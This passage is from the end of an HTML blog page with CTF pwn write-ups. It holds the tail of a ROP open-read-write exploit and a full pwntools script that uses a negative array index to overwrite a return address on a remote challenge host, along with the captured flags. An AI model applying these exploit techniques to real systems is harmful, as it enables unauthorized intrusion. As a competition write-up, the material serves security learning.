class="string">b&#x27;data:\n&#x27;</span>)</span><br><span class="line">r.send(<span class="string">b&#x27;x&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># orw</span></span><br><span class="line">bss = pie_base + elf.bss()</span><br><span class="line">pop_rax = libc_base + <span class="number">0xd4f97</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x102dea</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x53887</span></span><br><span class="line">mov_rdx_rax = libc_base + <span class="number">0x128507</span></span><br><span class="line">ret = pie_base + <span class="number">0x101a</span></span><br><span class="line">syscall = pie_base + <span class="number">0x11dd</span></span><br><span class="line">flag = pie_base + <span class="number">0x2008</span></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;logs:\n&#x27;</span>)</span><br><span class="line">pl = flat([<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">8</span>),canary,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>,</span><br><span class="line">           <span class="comment">#pop_rdi,0,pop_rsi,bss+0x100,pop_rax,0x40,mov_rdx_rax,pop_rax,0,syscall,</span></span><br><span class="line">           <span class="comment">#pop_rdi,bss+0x100,pop_rsi,0,pop_rax,2,syscall,</span></span><br><span class="line">           pop_rdi,flag,pop_rsi,<span class="number">0</span>,pop_rax,<span class="number">2</span>,syscall,</span><br><span class="line">           pop_rdi,<span class="number">3</span>,pop_rsi,bss+<span class="number">0x300</span>,pop_rax,<span class="number">0x100</span>,mov_rdx_rax,pop_rax,<span class="number">0</span>,syscall,</span><br><span class="line">           pop_rdi,<span class="number">1</span>,pop_rsi,bss+<span class="number">0x300</span>,pop_rax,<span class="number">0x50</span>,mov_rdx_rax,pop_rax,<span class="number">1</span>,syscall])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(pl)%<span class="number">16</span>)</span><br><span class="line">r.send(pl)</span><br><span class="line"><span class="comment">#r.send(b&#x27;./flag&#x27;)</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># SYC&#123;7r4ck3r_tr19g3red_019a42d9c39879f4942065387f376fd3&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="Mission-Absolutely-Abyss"><a href="#Mission-Absolutely-Abyss" class="headerlink" title="Mission Absolutely Abyss"></a>Mission Absolutely Abyss</h3><blockquote><p>æˆ‘ä»¬èº«é™·å›¹åœ„ã€‚<br>æˆ‘ä»¬ä»¥ä¸ºè‡ªå·±ä¼šé€ƒç¦»æ­»äº¡ï¼Œ<br>å´ä¸çŸ¥æ­»äº¡æ—©å·²æˆä¸ºæˆ‘ä»¬çš„ä¸€éƒ¨åˆ†ã€‚</p><p>æˆ‘ä»¬é™·å…¥é‚£ç»å¯¹çš„å¹»æƒ³ï¼Œ<br>ç›´åˆ°ç°å®çš„æ®‹å½±åœ¨æ¢¦å¢ƒä¸­çªå…€åœ°æ˜¾åƒâ€”â€”<br>é‚£äº›åºŸå¢Ÿã€ç«æ˜Ÿã€è¡€ä¸ç°çƒ¬ï¼Œå’Œè¢«çƒ§æ¯çš„å¤©ç©ºï¼Œ<br>æ— æ—¶æ— åˆ»ä¸åœ¨è‹¦ç—›åœ°å›å“</p><p>ä¹Ÿè®¸æˆ‘ä»¬ä¸åœ¨æ·±æ¸Šä¹‹ä¸­ï¼Œ<br>æ·±æ¸Šå°±æ˜¯æˆ‘ä»¬ã€‚<br>å› ä¸ºæ²¡æœ‰é‚£ç‰‡å¤©ç©ºï¼Œ<br>æˆ‘ä»¬æ‰å¼€å§‹ä»°æœ›ã€‚</p></blockquote><p>è´Ÿæº¢å‡º+è¶Šä¸‹æ ‡ä¿®æ”¹è¿”å›åœ°å€ä¸ºbcã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;geek.ctfplus.cn&#x27;</span>,<span class="number">30827</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è´Ÿæº¢</span></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;array:\n&#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ”¹è¿”å›åœ°å€</span></span><br><span class="line">bc = <span class="number">0x4007da</span></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choice:\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;write: \n&#x27;</span>,<span class="string">b&#x27;14&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;num\n&#x27;</span>,<span class="built_in">str</span>(bc).encode())</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choice:\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;write: \n&#x27;</span>,<span class="string">b&#x27;15&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;num\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">0</span>).encode())</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choice:\n&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># SYC&#123;runasama_no_purezento:019a4396a7197c418ef82109160961f1&#125;</span></span><br></pre></td></tr></table></figure></div><div class="article-footer"></div></article><section id="comments"><div id="vcomments"></div></section></div><nav class="bar bar-footer clearfix" data-stick-bottom><div class="bar-inner"><ul class="pager pull-left"><li class="prev"><a href="/2025/12/11/match-HSCCTF-2025/" title="HSCCTF 2025"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;ä¸Šä¸€ç¯‡</span></a></li><li class="next"><a href="/2025/08/16/match-%E7%AC%AC%E4%B8%80%E5%B1%8ANetDreamCTF/" title="ç¬¬ä¸€å±ŠNetDreamCTF"><span>ä¸‹ä¸€ç¯‡&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a></li><li class="toggle-toc"><a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="æ–‡ç« ç›®å½•" role="button"><span>[&nbsp;</span><span>æ–‡ç« ç›®å½•</span> <i class="text-collapsed icon icon-anchor"></i> <i class="text-in icon icon-close"></i> <span>]</span></a></li></ul><button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>èµ</span></button><div class="bar-right"><div class="share-component" data-sites="weibo,qq,wechat" data-mobile-sites="weibo,qq,wechat"></div></div></div></nav><div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog"><div class="modal-dialog" role="document"><div class="modal-content donate"><button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button><div class="modal-body"><div class="donate-box"><div class="donate-head"><p>è¿™ç¯‡æ–‡ç« å¯¹ä½ æœ‰ç”¨ï¼Œèµä¸€æ¯å’–å•¡â˜•~~</p></div><div class="tab-content"><div role="tabpanel" class="tab-pane fade active in" id="wechatpay"><div class="donate-payimg"><img src="/images/donate/wechatpayimg.png" alt="æ‰«ç æ”¯æŒ" title="æ‰«ä¸€æ‰«"></div><p class="text-muted mv">âLazzaroâ </p><p class="text-grey">æ‰“å¼€å¾®ä¿¡æ‰«ä¸€æ‰«å³å¯æ‰«ç æ‰“èµä»–ä¸€æ³¢å“¦~</p></div><div role="tabpanel" class="tab-pane fade" id="alipay"><div class="donate-payimg"><img src="/images/donate/alipayimg.png" alt="æ‰«ç æ”¯æŒ" title="æ‰«ä¸€æ‰«"></div><p class="text-muted mv">âLazzaroâ </p><p class="text-grey">æ‰“å¼€æ”¯ä»˜å®æ‰«ä¸€æ‰«å³å¯æ‰«ç æ‰“èµä»–ä¸€æ³¢å“¦~</p></div></div><div class="donate-footer"><ul class="nav nav-tabs nav-justified" role="tablist"><li role="presentation" class="active"><a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="true"><i class="icon icon-wepay"></i> å¾®ä¿¡æ”¯ä»˜</a></li><li role="presentation"><a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="false"><i class="icon icon-alipay"></i> æ”¯ä»˜å®</a></li></ul></div></div></div></div></div></div></main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter"><ul class="social-links"><li><a href="https://github.com/Lazzzaro" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li></ul><div class="copyright">&copy; 2025 Lazzaro<br><span>æ€»è®¿é—® - <span id="busuanzi_value_site_pv"></span>æ¬¡</span><br><span>è®¿å®¢æ•° - <span id="busuanzi_value_site_uv"></span>äºº</span><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer><script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script><script>window.jQuery||document.write('<script src="js/jquery.min.js"><\/script>')</script><script src="/js/plugin.min.js"></script><script src="/js/application.js"></script><script>window.INSIGHT_CONFIG={TRANSLATION:{POSTS:"æ–‡ç« ",PAGES:"é¡µé¢",CATEGORIES:"ç±»åˆ«",TAGS:"å…³é”®è¯",UNTITLED:"(æœªå‘½å)"},ROOT_URL:"/",CONTENT_URL:"/content.json"}</script><script src="/js/insight.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//cdn.jsdelivr.net/npm/valine"></script><script type="text/javascript">var GUEST=["nick","mail","link"],meta=(meta="nick,mail,link").split(",").filter(function(e){return-1<GUEST.indexOf(e)});new Valine({el:"#vcomments",verify:!1,notify:!1,appId:"sK4BUsDgfSB843HYgJyTcV7P-gzGzoHsz",appKey:"NKNx8m2CtFeDofr8LNLX7aNG",placeholder:"æ¥æ¥æ¥è¯´ç‚¹å•¥~~\r\nå¯¹ä½ æœ‰ç”¨ï¼Ÿèµä¸€æ³¢ï¼â†˜â†˜",avatar:"mp",meta:meta,pageSize:"10",visitor:!0})</script><script defer type="text/javascript">!function(e,a,t,n,g,c){e.GoogleAnalyticsObject=n,e.ga=e.ga||function(){(e.ga.q=e.ga.q||[]).push(arguments)},e.ga.l=+new Date,g=a.createElement(t),c=a.getElementsByTagName(t)[0],g.async=1,g.src="//www.google-analytics.com/analytics.js",c.parentNode.insertBefore(g,c)}(window,document,"script","ga"),ga("create","UA-165804489-1","auto"),ga("send","pageview")</script><style>.copy-btn{display:inline-block;padding:6px 12px;font-size:13px;font-weight:700;line-height:20px;color:#333;white-space:nowrap;vertical-align:middle;cursor:pointer;background-color:#eee;background-image:linear-gradient(#fcfcfc,#eee);border:1px solid #d5d5d5;border-radius:3px;user-select:none;outline:0}.highlight-wrap .copy-btn{transition:opacity .3s ease-in-out;opacity:0;padding:2px 6px;position:absolute;right:4px;top:8px;z-index:2}.highlight-wrap .copy-btn:focus,.highlight-wrap:hover .copy-btn{opacity:1}.highlight-wrap{position:relative}</style><script>addLoadEvent(()=>{$(".highlight").each(function(t,e){var n=$("<div>").addClass("highlight-wrap");$(e).after(n),n.append($("<button>").addClass("copy-btn").append("å¤åˆ¶").on("click",function(t){var e=$(this).parent().find(".code")[0].innerText;e+="\n/**\n* å¤åˆ¶å¹¶ä½¿ç”¨ä»£ç è¯·æ³¨æ˜å¼•ç”¨å‡ºå¤„å“¦~\n* Lazzaro @ https://lazzzaro.github.io\n*/";var n=document.createElement("textarea");document.body.appendChild(n),n.style.position="absolute",n.style.top="0px",n.style.left="0px",n.value=e,n.select(),n.focus();e=document.execCommand("copy");document.body.removeChild(n),e?$(this).text("å¤åˆ¶æˆåŠŸ"):$(this).text("å¤åˆ¶å¤±è´¥"),$(this).blur()})).on("mouseleave",function(t){var e=$(this).find(".copy-btn");setTimeout(function(){e.text("å¤åˆ¶")},300)}).append(e)})})</script><script type="text/x-mathjax-config">MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script></body></html>